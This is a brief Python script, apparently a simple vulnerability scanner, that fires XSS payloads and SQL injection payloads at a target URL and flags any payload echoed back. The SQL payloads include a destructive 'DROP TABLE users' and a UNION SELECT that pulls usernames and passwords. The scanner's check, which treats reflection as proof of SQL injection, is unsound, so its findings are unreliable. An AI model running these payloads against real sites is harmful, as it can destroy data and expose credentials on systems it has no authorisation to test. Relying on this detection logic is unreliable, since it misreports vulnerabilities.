import requests

# Define the target URL
target_url = "http://www.example.com/"

# Define a list of strings to test for XSS vulnerabilities
xss_payloads = ['<script>alert("XSS!");</script>', '<img src=x onerror=alert("XSS!");>', '<svg onload=alert("XSS!");>', '<iframe src="javascript:alert(\'XSS!\');"></iframe>']

# Define a list of SQL injection payloads
sql_payloads = ['\' OR 1=1 --', '1; DROP TABLE users', '\' UNION SELECT username, password FROM users;']

# Define a function to test for XSS vulnerabilities
def test_xss(payload):
    # Send a GET request to the target URL with the XSS payload
    response = requests.get(target_url + payload)

    # Check if the payload is reflected in the response
    if payload in response.text:
        print("[XSS VULNERABILITY FOUND] Payload: " + payload)
    else:
        print("[XSS VULNERABILITY NOT FOUND] Payload: " + payload)

# Define a function to test for SQL injection vulnerabilities
def test_sql(payload):
    # Send a GET request to the target URL with the SQL injection payload
    response = requests.get(target_url + "?id=" + payload)

    # Check if the payload is reflected in the response
    if payload in response.text:
        print("[SQL INJECTION VULNERABILITY FOUND] Payload: " + payload)
    else:
        print("[SQL INJECTION VULNERABILITY NOT FOUND] Payload: " + payload)

# Loop through the XSS payloads and test for vulnerabilities
for xss_payload in xss_payloads:
    test_xss(xss_payload)

# Loop through the SQL injection payloads and test for vulnerabilities
for sql_payload in sql_payloads:
    test_sql(sql_payload)
